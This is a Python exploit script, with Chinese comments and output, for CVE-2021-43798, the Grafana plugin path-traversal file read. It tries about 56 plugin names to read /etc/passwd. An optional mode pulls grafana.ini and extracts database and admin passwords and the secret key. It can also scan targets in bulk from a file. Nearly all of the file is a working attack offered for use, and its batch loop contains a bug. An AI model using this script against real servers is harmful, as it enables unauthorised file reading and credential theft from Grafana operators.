#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import requests
from bs4 import BeautifulSoup
import re
import json

requests.packages.urllib3.disable_warnings()

def poc(target,plugin):
    token = ""#pushplus的token
    #url = target.strip('/') + '/public/plugins/'+plugin+'#%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
    #msg = "http://pushplus.hxtrip.com/send?token="+token+"&title=漏洞地址&content="+url+"&template=html"  #对接pushplus
    url = target.strip('/') + '/public/plugins/' + plugin + '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"
    }
    try:
        resp = requests.get(url, headers=headers, verify=False)
        if 'root:x:0' in resp.text and resp.status_code==200:
            #rsp = requests.get(url=msg, headers=headers, verify=False)
            #print(rsp)
            #plu = plu.append(plugin)
            return "[+] {} 存在任意文件读取漏洞".format(target)+"\r\nplugin为："+plugin+"\r\nurl :"+url
        elif resp.status_code == 400:
            return "[~] {} 可能存在Nginx反代，该漏洞可能存在，请进一步验证。".format(target)
        else:
            return "[-] {} 不存在任意文件读取漏洞".format(target)

    except Exception as e:
        return "访问错误"
        #print("访问错误。")

def infoLeak(url,plu0):#参考自Hokin师傅
    iniFileUrl = url.strip('/') +"/public/plugins/"+plu0+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini"
    #dbFileUrl = url+"/public/plugins/"+plu0+"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/var/lib/grafana/grafana.db" #grafana.db有时间的师傅自己研究一下，有成果了可否白嫖一手？
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"
    }
    resp = requests.get(iniFileUrl,headers=headers,verify=False)
    try:
        if resp.status_code == 200:
            host = re.findall(r';host =(.*)', resp.text)[0]
            name = re.findall(r';name =(.*)', resp.text)[0]
            user = re.findall(r';user =(.*)', resp.text)[0]
            password = re.findall(r';password =(.*)', resp.text)[0]
            admin_user = re.findall(r';admin_user =(.*)', resp.text)[0]
            admin_password = re.findall(r';admin_password =(.*)', resp.text)[0]
            secret_key = re.findall(r';secret_key =(.*)', resp.text)[0]
            return "host: "+host+"\r\nname: "+name+"\r\nuser: "+user+"\r\npassword: "+password+"\r\nadmin_user: "+admin_user+"\r\nadmin_password: "+admin_password+"\r\nscret_key: "+secret_key
        else:
            return url+" 无法访问配置文件。"
    except Exception as e:
        return "网络错误"
        #print("网络错误。")

if __name__ == "__main__":
    print('''
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██╗      ██╗  ██╗██████╗ ███████╗ █████╗  █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗███║      ██║  ██║╚════██╗╚════██║██╔══██╗██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝╚██║█████╗███████║ █████╔╝    ██╔╝╚██████║╚█████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ██║╚════╝╚════██║ ╚═══██╗   ██╔╝  ╚═══██║██╔══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗ ██║           ██║██████╔╝   ██║   █████╔╝╚█████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝           ╚═╝╚═════╝    ╚═╝   ╚════╝  ╚════╝ 
                                                                                        
                                                        CVE-2021-43798 任意文件读取漏洞          by luckyZ
                                
example：
        python3 vul.py -u https://1.1.1.1:3000 检测漏洞是否存在及可用插件名称
        python3 vul.py -u https://1.1.1.1:3000 -info 检测漏洞是否存在及可用插件名称，并返回配置文件中部分敏感信息
        python3 vul.py -f 1.txt 批量检测漏洞是否存在          
    ''')
    print("*" * 50)
    plugins = ['alertlist',
               'annolist',
               'barchart',
               'bargauge',
               'candlestick',
               'cloudwatch',
               'dashlist',
               'elasticsearch',
               'gauge',
               'geomap',
               'gettingstarted',
               'grafana-azure-monitor-datasource',
               'graph',
               'heatmap',
               'histogram',
               'influxdb',
               'jaeger',
               'logs',
               'loki',
               'mssql',
               'mysql',
               'news',
               'nodeGraph',
               'opentsdb',
               'piechart',
               'pluginlist',
               'postgres',
               'prometheus',
               'stackdriver',
               'stat',
               'state-timeline',
               'status-history',
               'table',
               'table-old',
               'tempo',
               'testdata',
               'text',
               'timeseries',
               'welcome',
               'zipkin',
               'alertGroups',
               'debug',
               'icon',
               'live',
               'state-timeline ',
               'xychart',
               'canvas',
               'alertmanager',
               'cloud-monitoring',
               'mixed',
               'dashboard',
               'grafana',
               'graphite',
               'grafana-clock-panel',
               'satellogic-3d-globe-panel',
               'grafana-simple-json-datasource']
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-u', type=str, help='url')
    parser.add_argument('-f', help='file', type=str)
    parser.add_argument('-info',help='grafana.ini',action="store_true")
    args = parser.parse_args()
    plu = []
    if args.u:
        for plugin in plugins:
            r = poc(args.u,plugin)
            if "[+]" in r:
                plu.append(plugin)
            # else:
            #     print("")
        if plu != []  and not args.info:
            print("目标地址 "+args.u+" 存在任意文件读取漏洞！")
            print("可利用插件为： \r\n"+str(plu))
            #print(1)
        elif plu != [] and args.info:
            print("目标地址 " + args.u + " 存在任意文件读取漏洞！")
            print("可利用插件为： \r\n" + str(plu))
            print("*"*50)
            print("\r\n【infoLeak】")
            info = infoLeak(args.u,plu[0])
            print(info)
        else:
            print("目标地址 "+args.u+" 不存在任意文件读取漏洞。")
    if args.f:
        with open(args.f, "r") as f:
            for url in f.readlines():
                url = url.strip("\n").strip(" ")
                for plugin in plugins:
                    r = poc(args.u, plugin)
                    if "[+]" in r:
                        plu.append(plugin)
                if plu != [] and not args.info:
                    print("目标地址 " + url + " 存在任意文件读取漏洞！")
                    print("可利用插件为： \r\n" + str(plu))
                    print(1)
                elif plu != [] and args.info:
                    print("目标地址 " + url + " 存在任意文件读取漏洞！")
                    print("可利用插件为： \r\n" + str(plu))
                    print("*" * 50)
                    print("\r\n【infoLeak】")
                    info = infoLeak(url, plu[0])
                    print(info)
                else:
                    print("目标地址 " + url + " 不存在任意文件读取漏洞。")




